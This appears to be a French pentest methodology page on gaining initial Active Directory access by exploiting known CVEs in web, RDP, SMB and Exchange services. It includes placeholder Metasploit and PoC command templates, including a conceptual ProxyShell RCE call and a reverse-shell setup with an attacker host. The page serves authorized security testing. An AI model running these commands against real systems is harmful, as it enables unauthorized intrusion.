# III.A. Exploitation de Vulnérabilités Publiques

Cette section couvre l'obtention d'un accès initial en exploitant des vulnérabilités connues sur des services exposés par l'organisation, qu'ils soient directement liés à l'AD ou sur des systèmes périphériques pouvant donner un accès au réseau interne.

## 1. Identification des Services Exposés
*   Utiliser les résultats de la phase de [Reconnaissance Initiale](../01-reconnaissance-initiale/README.md) (Nmap, Shodan, Censys).
*   Focus sur : Serveurs Web (IIS, Apache, etc.), RDP, SMB, VPN, Exchange (OWA), SharePoint.

## 2. Recherche de Vulnérabilités (CVEs)
*   **Outils :**
    *   `searchsploit <service_version>`: Recherche dans la base de données Exploit-DB.
    *   Google Dorks : `"<service_version>" + CVE`, `"<service_version>" + exploit`.
    *   Sites : `cvedetails.com`, `mitre.org`.
    *   Scanners de vulnérabilités (Nessus, OpenVAS) si autorisés dans le cadre de la mission.

## 3. Exemples d'Exploitation Courants

### a. Vulnérabilités Web
*   **Exemples :** RCE (Remote Code Execution) via upload de fichiers, injections SQL, désérialisation, failles SSRF menant à une RCE interne.
*   **Outils :** Metasploit Framework (`msfconsole`), exploits Python/Ruby/etc. personnalisés, Burp Suite.
    ```bash
    # Exemple Metasploit (fictif)
    msfconsole
    msf > search <CVE_ID_OU_NOM_SERVICE>
    msf > use exploit/<chemin_vers_exploit>
    msf > set RHOSTS <IP_CIBLE>
    msf > set LHOST <IP_ATTAQUANT>
    msf > exploit
    ```

### b. Vulnérabilités RDP
*   **Exemples :** BlueKeep (CVE-2019-0708), DejaBlue (CVE-2019-1181/1182).
*   **Outils :** Modules Metasploit, PoCs publics.
    ```bash
    # Exemple avec un PoC (fictif)
    python cve-xxxx-xxxx_poc.py <IP_CIBLE>
    ```

### c. Vulnérabilités SMB
*   **Exemples :** EternalBlue (MS17-010), SMBGhost (CVE-2020-0796).
*   **Outils :** Metasploit, PoCs.
    ```bash
    # Vérification MS17-010 avec Nmap
    nmap -p 445 --script smb-vuln-ms17-010 <IP_CIBLE>
    ```

### d. Vulnérabilités Exchange
*   **Exemples :** ProxyLogon (CVE-2021-26855), ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207).
*   **Outils :** PoCs publics sur GitHub.
    ```bash
    # Exemple (conceptuel) pour ProxyShell
    python proxyshell_rce.py -u https://<exchange_server>/owa/auth/x.js <email_cible> "commande_a_executer"
    ```

## 4. Post-Exploitation Initiale
*   Obtenir un shell (meterpreter, netcat, etc.).
*   Stabiliser l'accès.
*   Commencer l'[Énumération Locale Approfondie](../04-post-compromission/A-enumeration-locale.md).

**Note Importante :** Toujours vérifier la portée de l'audit avant d'exploiter activement des vulnérabilités. Privilégier les exploits non destructifs. 